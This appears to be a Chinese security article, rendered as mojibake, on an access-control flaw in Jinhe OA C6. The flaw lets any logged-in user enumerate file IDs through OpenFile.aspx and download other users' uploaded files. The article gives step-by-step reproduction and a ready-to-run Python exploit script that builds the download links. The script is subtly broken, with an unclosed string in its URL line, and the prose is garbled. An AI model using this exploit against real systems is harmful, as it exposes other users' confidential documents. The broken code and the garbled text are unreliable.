> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/90HM3LqODBN35iqRBRE1HA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

**é‡‘å’Œ OA C6 å­˜åœ¨åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´ï¼Œæ™®é€šç”¨æˆ·é€šè¿‡éå†ç‰¹æ®Šå‚æ•°å¯ä»¥è·å–å…¶ä»–ç”¨æˆ·ä¸Šä¼ çš„æ•æ„Ÿæ–‡ä»¶**

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

**é‡‘å’Œ OA C6**

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

**ç™»å½•åç‚¹å‡»ä¿¡æ¯äº¤æµï¼Œå‘èµ·ååŒé¡µé¢**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE81lTSgMMVhy6ReN0Lyt8giaKYFxhvKUic2icCGEOkSmxKA1FPjwKDMQ0xg/640?wx_fmt=png)

**ä¸Šä¼ é™„ä»¶å¹¶ä¸Šä¼ å‘é€ç»™ç›®æ ‡**

**è¿™é‡Œç™»å½•æƒé™ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬è‡ªå·±å‘ç»™è‡ªå·±å°±å¥½ï¼Œå‰æ–‡åªæ˜¯å±•ç°æ¼æ´æŒ–æ˜æ€è·¯è¿‡ç¨‹**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE83DzIqZ6Wbd9gkT8LtOB3MCbMnibfianzgVZR8oCP2TPg5ThF315hcywQ/640?wx_fmt=png)

**æˆåŠŸæ”¶åˆ°ä¸Šä¼ çš„é™„ä»¶**  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8RCz7Vlyty8NMRsmZaPHiapoKTIl0UbREoauEW6OvIKvTnz6xCpXlGVA/640?wx_fmt=png)

**ç‚¹å‡»æŸ¥çœ‹æ—¶æŠ“åŒ…ï¼Œå‘ç°ä¸€ä¸ªå¸¦æœ‰æ–‡ä»¶ ID çš„è¯·æ±‚åŒ…**  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8GZyibbvH1ZcGksYutiaGrbr3ZDStCymUCXQkHlUxOXgJ4t4kPGahlmbw/640?wx_fmt=png)

**è¿”å›äº†å‡ ä¸ªå‚æ•°**

```
var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png';
var strFileType = 'png';
var strSid='3jvpvhs410m2wdbbficax5q5';
var strFileIDCode='us9w7xWE7do=';
var strId = '1229';
var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log';
var strImgReg = 'jpg,gif,jpeg,png,ico';
var MD = '';
```

**å…¶ä¸­æˆ‘ä»¬æ³¨æ„åˆ° strFilePath ä¸ºæ–‡ä»¶çš„å­˜å‚¨åœ°å€ï¼Œæˆ‘ä»¬æ›´æ”¹ id å‚æ•°ä¸ºå¦ä¸€ä¸ªå€¼ï¼Œä¸”æµ‹è¯•åå‘ç° name æ–‡ä»¶åå‚æ•°æ— å…³ç´§è¦**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8XZbeIibBXyKvpr0FQliaSyW0MiaNyJicnAPP7libC5hy7sJgmO89GERibItw/640?wx_fmt=png)

**æ›´æ”¹ ID åå‘é€è¯·æ±‚åŒ…å‘ç°è·å¾—å¦ä¸€ä¸ªæ–‡ä»¶çš„ä¿¡æ¯**

**è®¿é—® Urlï¼Œæ³¨æ„ **type å‚æ•°** éœ€è¦ä¸ºæ­£ç¡®çš„æ–‡ä»¶åç¼€æ‰å¯ä»¥è®¿é—®**

```
http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE81gjFPdWwrZBqxVmksGJ2yB6DRwk35qZStjicuicUZp5DDFcsLxGR8tgQ/640?wx_fmt=png)

**è¿™é‡Œæ›´æ¢ä¸€ä¸ªæ™®é€šç”¨æˆ·æµ‹è¯•æ˜¯å¦å¯è¡Œï¼Œå°è¯•éå† id**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8MtWRKdbSB0euicFwsahVqVXOonjtNvmjY08E2UuRsJjgQe08DHQkBVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8moxMia8nNAUHbwtialrfLiaOo5ZgkOrGpFskNQia50RV6YuqoUTHlPicBHw/640?wx_fmt=png)

**å­˜åœ¨ **strFilePath å‚æ•°** åˆ™æ˜¯å­˜åœ¨æ–‡ä»¶ï¼Œä¸ºç©ºåˆ™æ˜¯æ–‡ä»¶å·²ç»ä¸å­˜åœ¨**

**åŒæ—¶æŠ“åŒ…ä¸‹è½½æ–‡ä»¶é¡µé¢ä¹Ÿå¯ä»¥çœ‹åˆ°å¯è·å–çš„å‚æ•°** ****FileID ä¸ FileIDCode****

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8GETdfeqB4mlBYppx2kI48zFrpClGyPaozgUuJZ6XKqqdA9nAibzlQCg/640?wx_fmt=png)

**äºæ˜¯åªéœ€è¦é€šè¿‡åˆšåˆšçš„ ID éå†ï¼Œè·å–ä¸¤ä¸ªå…³é”®å‚æ•°å°±èƒ½ä¸‹è½½å…¶ä»–äººå‘é€çš„æ•æ„Ÿæ–‡ä»¶ï¼Œä¸”åªéœ€è¦æ™®é€šç”¨æˆ·æƒé™**

 ****å››:Â  æ¼æ´ POCğŸ¦‰****

```
POCåªæ£€æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä¸”æ¼æ´å­˜åœ¨äºåå°éœ€è¦ç™»å½•
è¿è¡Œåè®¿é—®é“¾æ¥å³å¯ä¸‹è½½æ–‡ä»¶
```

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34må…¬ä¼—å·  : PeiQiæ–‡åº“                                                   \033[0m')
    print('+  \033[34mVersion: é‡‘å’ŒOA C6                                                  \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, file_id, cookie):
    vuln_url = target_url + "/C6/control/OpenFile.aspx?id={}&.format(file_id)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie":cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ Url: {}\033[0m".format(vuln_url))
        if "strFilePath =" in response.text and response.status_code == 200:
            strFilePath = re.findall(r"var strFilePath = '(.*?)';", response.text)[0]
            strFileType = strFilePath[-3:]
            strFileIDCode = re.findall(r"var strFileIDCode='(.*?)';", response.text)[0]
            strId = re.findall(r"var strId = '(.*?)';", response.text)[0]
            sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0]
            if strFilePath != "":
                print("\033[36m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´, è·å–æ–‡ä»¶ä¿¡æ¯:\n[o] æ–‡ä»¶è·¯å¾„ï¼š{}\n[o] æ–‡ä»¶ç±»å‹ï¼š{}\n[o] æ–‡ä»¶ID codeï¼š{}\n[o] æ–‡ä»¶ç¼–å·ï¼š{}\033[0m".format(target_url, strFilePath, strFileType,strFileIDCode, strId ))
                print("\033[32m[o] æ–‡ä»¶ä¸‹è½½é“¾æ¥ä¸º: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}".format(target_url, strId, strFileIDCode, sid))
            else:
                print("\033[31m[x] ç›®æ ‡ {} æ–‡ä»¶ä¸å­˜åœ¨     \033[0m".format(target_url))
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´     \033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    file_id = str(input("\033[35mFile_id >>> \033[0m"))
    cookie = str(input("\033[35mCookie  >>> \033[0m"))
    POC_1(target_url, file_id, cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8dsvhF7kytMNZGyREG9Uia7R8BxlAUv7gFZCxicNJia3ZJAxRv4XCZoiaNg/640?wx_fmt=png)

 ****äº”:Â  å…³äºæ–‡åº“ğŸ¦‰****

**åœ¨çº¿æ–‡åº“ï¼š**

**http://wiki.peiqi.tech**

**Githubï¼š**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“å’Œå›¢é˜Ÿçš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨äº¤æµç¾¤å’Œå…¬ä¼—å·ï¼Œæƒ³è¦æŠ•ç¨¿çš„å¸ˆå‚…ä¹Ÿå¯ä»¥åŠ æˆ‘æŠ•ç¨¿
> 
> æƒ³è¦åŠ å…¥äº¤æµç¾¤çš„å¸ˆå‚…å…¬ä¼—å·ç‚¹å‡»äº¤æµç¾¤åŠ æˆ‘æ‹‰ä½ å•¦~
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­

å…¬ä¼—å·

**åŒæ—¶çŸ¥è¯†æ˜Ÿçƒä¹Ÿå¼€æ”¾è¿è¥å•¦ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬æ”¯æŒæ”¯æŒå•¦ğŸŸ**

**çŸ¥è¯†æ˜Ÿçƒé‡Œä¼šæŒç»­å‘å¸ƒä¸€äº›æ¼æ´å…¬å¼€ä¿¡æ¯å’ŒæŠ€æœ¯æ–‡ç« ~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YmG0oicA5Gib9brhhvwQOE8XYThWYX7FkzmperVYOAZHCgj1U2LkYZCIeu3b8wk0hGnziamefb5h2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuCFdyVD9UlKcV0COuXd5oajiacmB5LB71gLdCaEhRaiaicMTS8oq55s9pA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZu0SvJFXqSugecfEnJujNOic73ouoGndJPRvezpAstLqLJDqe6JqJsf2Q/640?wx_fmt=png)